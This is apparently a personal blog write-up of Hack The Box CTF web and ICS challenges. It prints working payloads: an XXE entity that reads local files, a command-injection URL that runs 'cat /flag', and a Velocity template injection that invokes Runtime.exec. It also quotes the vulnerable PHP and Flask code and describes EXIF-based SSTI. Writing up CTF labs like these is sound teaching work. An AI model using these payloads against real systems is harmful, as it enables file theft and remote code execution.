---
title: "HTB CTF Try Out Write-up"
description: "HTB CTF Try Out Web and ICS write-ups: command and template injection, and hidden information in Modbus/TCP captures analyzed with Wireshark."
date: "2025-08-30"
tags:
  - "HTB"
  - "CTF"
  - "Web"
  - "XXE"
authors:
  - "bx"
draft: false
slug: "htb-ctf-en"
lang: "en"
translationKey: "htb-ctf"
---

# HTB-CTF Try Out Analysis and Write-ups

> Competition address:
>
> https://ctf.hackthebox.com/event/1434

## WEB

### Jailbreak

> The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in /flag.txt
> The crew obtains an experimental Pip-Boy from a black-market merchant, realizing it could unlock Vault 79, a heavily guarded underground shelter. Back at their hideout, the hackers and engineers work together to jailbreak the device, carefully bypassing its sophisticated biometric locks. Can you use custom firmware and a series of precise modifications to bring the device to full operational status so it can pair with the vault door's access port? The flag is located at /flag.txt.

Entering the challenge, it looks like a game.

After looking around, I found an XML update page where the data can be changed.

![](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230228844.png)

Let's try XXE.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]> <root> <name>&xxe;</name> </root>
```

But it requires `An error occurred: The root element must be 'FirmwareUpdateConfig'.`.

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>1.0</Version>
    <name>&xxe;</name>
  </Firmware>
</FirmwareUpdateConfig>

```

After several tests and observations, it turns out this is a variable output.

![image-20250830214238440](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230231582.png)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <name>&xxe;</name>
  </Firmware>
</FirmwareUpdateConfig>

```

The XXE injection succeeded, and we got the flag.

![image-20250830214513005](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230307320.png)

### Flag Command

> Embark on the "Dimensional Escape Quest" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!
> Embark on the “Dimensional Escape Quest”: you wake in a mysterious forest maze that seems not to belong to this world. Navigate a whimsical labyrinth of singing squirrels, mischievous nymphs, and grumpy wizards; it may lead to otherworldly surprises. Will you conquer the enchanted maze or get lost in another dimension of magical challenges? This mystical escape journey begins!

I tried things at random as instructed, but didn't find anything.

![image-20250830215143029](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230235562.png)

Let's look at the front-end code.

```javascript
export const START = 'YOU WAKE UP IN A FOREST.';

export const INITIAL_OPTIONS = [
    '<span class="command">You have 4 options!</span>',
    'HEAD NORTH',
    'HEAD SOUTH',
    'HEAD EAST',
    'HEAD WEST'
];

export const GAME_LOST =  'You <span class="command error">died</span> and couldn\'t escape the forest. Press <span class="command error">restart</span> to try again.';

export const GAME_WON = 'You <span class="command success">escaped</span> the forest and <span class="command success">won</span> the game! Congratulations! Press <span class="command success">restart</span> to play again.';

export const INFO = [
    "You abruptly find yourself lucid in the middle of a bizarre, alien forest.",
    "How the hell did you end up here?",
    "Eerie, indistinguishable sounds ripple through the gnarled trees, setting the hairs on your neck on edge.",
    "Glancing around, you spot a gangly, grinning figure lurking in the shadows, muttering 'Xclow3n' like some sort of deranged mantra, clearly waiting for you to pass out or something. Creepy much?",
    "Heads up! This forest isn't your grandmother's backyard.",
    "It's packed with enough freaks and frights to make a horror movie blush. Time to find your way out.",
    "The stakes? Oh, nothing big. Just your friends, plunged into an abyss of darkness and despair.",
    "Punch in 'start' to kick things off in this twisted adventure!"
];

export const CONTROLS = [
    "Use the <span class='command'>arrow</span> keys to traverse commands in the command history.",
    "Use the <span class='command'>enter</span> key to submit a command.",
];

export const HELP = [
    '<span class="command help">start</span> Start the game',
    '<span class="command help">clear</span> Clear the game screen',
    '<span class="command help">audio</span> Toggle audio on/off',
    '<span class="command help">restart</span> Restart the game',
    '<span class="command help">info</span> Show info about the game',
];

```

That did not get us anywhere.

Finally, I found the key in the last API endpoint in `main.js`.

```js
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;

        })
        .catch(() => {
            availableOptions = undefined;
        })
}
```

![image-20250830220107950](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230240419.png)

This revealed a secret command.

```text
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

Posting JSON directly gives the result.

![image-20250830220704028](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230238564.png)

### TimeKORP

> Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.
> Are you ready to unravel the mysteries and reveal the truth hidden in KROP's digital domain? Join the challenge and prove your cybersecurity skills. Remember, time is money, but here the rewards may be much greater than you imagine.

This is code auditing.

The vulnerability is that the passed-in parameter is not handled and eventually reaches a dangerous function for execution.

![image-20250830223528608](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230245130.png)

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

The final payload is as follows:

```http
http://94.237.50.221:31205/?format=%H:%M:%S%27;cat%20/flag;echo%20%27
```

Got the flag.

### Labyrinth Linguist

> You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.
> You and your faction are cornered in a refuge corridor in a maze while being pursued by a KORP mutant exterminator. While planning your next move, you find a translator device left by previous Fray competitors. It translates English into Voxalith, an ancient language spoken by the civilization that originally built the maze. Voxalith was also spoken by the maze guardians, who were once benevolent but were turned against humans by a corrupting agent devised by KORP. You need to reverse-engineer the device to contact the mutant and seize your last chance to escape alive.

This is code auditing. First, determine that it is a Spring project. The key is:

```xml
<dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
</dependency>
```

Find the corresponding version:

```java
@RequestMapping("/")
@ResponseBody
String index(@RequestParam(required = false, name = "text") String textString) {
    if (textString == null) {
        textString = "Example text";
    }

    String template = "";

    try {
        template = readFileToString("/app/src/main/resources/templates/index.html", textString);
    } catch (IOException e) {
        e.printStackTrace();
    }

    RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
    StringReader reader = new StringReader(template);

    org.apache.velocity.Template t = new org.apache.velocity.Template();
    t.setRuntimeServices(runtimeServices);
    try {
        t.setData(runtimeServices.parse(reader, "home"));
        t.initDocument();
        VelocityContext context = new VelocityContext();
        context.put("name", "World");

        StringWriter writer = new StringWriter();
        t.merge(context, writer);
        template = writer.toString();
    } catch (ParseException e) {
        e.printStackTrace();
    }

    return template;
}
```

It parses templates using the Velocity engine:

```java
RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
StringReader reader = new StringReader(template);
t.setData(runtimeServices.parse(reader, "home"));
```

There is no filtering, so syntax can be executed.

https://juejin.cn/post/7246777406386929721

However, the specific template-injection syntax comes from a foreigner's blog.

https://antgarsil.github.io/posts/velocity/

```text
text=#set ($run=1 + 1) $run 
```

![image-20250831105644823](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831114832588.png)

It successfully outputs 2. Next, we continue with command execution.

```java
#set($x='')##
#set($str=$x.class.forName("java.lang.String"))##
#set($chr=$x.class.forName("java.lang.Character"))##
#set($ex=$x.class.forName("java.lang.Runtime").getRuntime().exec('cat /flag.txt'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

I still need to study this Java template injection topic in more depth.

### Guild

> Welcome to the Guild ! But please wait until our Guild Master verify you. Thanks for the wait
> Welcome to the Guild! Please wait while our Guild Master verifies you. Thanks for your patience.

This challenge is somewhat difficult and time-consuming to work with, but it is also SSTI. Let's analyze the vulnerability.

```py
@views.route("/verify",methods=["GET", "POST"])
@login_required
def verify():
    if current_user.username == "admin":
        if request.method == "POST":
            user_id = request.form.get("user_id")
            verf_id = request.form.get("verification_id")
            query = Verification.query.filter_by(id=verf_id).first()
            
            img = Image.open(query.doc)

            exif_table={}

            for k, v in img.getexif().items():
                tag = TAGS.get(k)
                exif_table[tag]=v

            if "Artist" in exif_table.keys():
                sec_code = exif_table["Artist"]
                query.verified = 1
                db.session.commit()
                return render_template_string("Verified! {}".format(sec_code))
            else:
                return render_template_string("Not Verified! :(")
    else:
        flash("Oops", category="error")
        return redirect(url_for("views.home"))
```

We can use the parameter `sec_code` with the [ExifTool](https://exiftool.org/) utility, ultimately achieving SSTI, although constructing the payload is quite complicated.

## ICS

> In a CTF (Capture The Flag) competition, **ICS** usually means **Industrial Control Systems**. This type of challenge involves simulating and penetration-testing systems in industrial environments, especially those used to monitor and control industrial equipment.

### Shush Protocol

> The crew sets their sights on an abandoned fertilizer plant, a desolate structure rumored to hold a cache of ammonium nitrate—crucial for their makeshift explosives. Navigating through the plant’s crumbling corridors, they reach the main control room where a dusty, outdated PLC still hums faintly with power. The crew's hackers spring into action, connecting their equipment to the network of the PLC and starting the process of extracting data. They know that finding the password the control device uses to connect to the PLC is key to gaining full access to it. The hackers deploy network enumeration tools to scan for active devices on the plant's internal network. They meticulously sift through IP addresses, looking for clues that might reveal the password. After several tense hours, they pinpoint the device—a ruggedized industrial computer buried under layers of dust, still linked to the PLC that performs certain diagnostic operations under a custom protocol on a specific interval. Having captured the traffic from that connection the only thing that remains is to locate the packet that contains the secret information.
> The crew targets an abandoned fertilizer plant, a desolate structure rumored to contain ammonium nitrate—a key ingredient for their improvised explosives. They make their way through the plant's crumbling corridors to the main control room, where a dusty, outdated PLC still hums faintly. The hackers connect their equipment to the PLC's network and begin extracting data. They know that finding the password used by the control device to connect to the PLC is key to gaining full access. They deploy network enumeration tools to scan for active devices on the plant's internal network, carefully examining IP addresses for clues that might reveal the password. After several tense hours, they pinpoint the device: a rugged industrial computer buried under layers of dust, still connected to the PLC, which performs certain diagnostic operations over a custom protocol at a specific interval. Having captured the traffic from that connection, all that remains is to locate the packet containing the secret information.

![image-20250830224133988](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230247571.png)

This one is simple: use Wireshark's packet-byte-stream search to find the flag.

![image-20250830223815009](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230251795.png)

I looked into this in more depth.

ICS mainly tests things related to custom protocols. This one uses Modbus.

Modbus/TCP is a communication protocol commonly used in industrial control systems, especially with PLCs (programmable logic controllers) and other industrial equipment. It communicates over TCP/IP networks and is usually used to retrieve equipment status or control equipment.

Function code:

- In the Modbus protocol, the function code defines the operation to be performed (for example, reading or writing registers).

- `Unknown function (102)` indicates that function code 102 is not defined in the standard Modbus protocol. It may therefore be a vendor-customized function or an abnormal response from the device.